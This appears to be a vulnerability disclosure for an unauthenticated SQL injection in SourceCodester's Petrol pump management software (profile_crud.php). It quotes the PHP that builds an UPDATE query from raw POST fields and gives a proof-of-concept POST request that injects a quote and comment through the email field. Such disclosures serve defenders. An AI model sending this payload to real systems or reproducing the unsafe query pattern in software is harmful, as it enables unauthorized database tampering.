# SOURCECODESTER / Petrol pump management software - profile_crud.php Unauthenticated SQL Injection

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

## Affected Component
> /admin/app/profile_crud.php

## Code
```php
	$stmt = $conn->prepare("UPDATE `login` SET `username`='" . $_POST['username'] . "',`email`='" . $_POST['email'] . "',`mobileno`='" . $_POST['mobileno'] . "',`image`='" . $img . "' WHERE id='" . $_SESSION['id'] . "' ");

	$stmt->execute();


	header("location:../dashboard.php");
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/app/profile_crud.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

update=&username=NoChizPlz&email=NoChizPlz@NoChizPlz.com'+#
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/c9f37617-947b-472e-bfd7-2113d054dde5)
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/044c9e7c-5051-4596-9101-48770914545a)

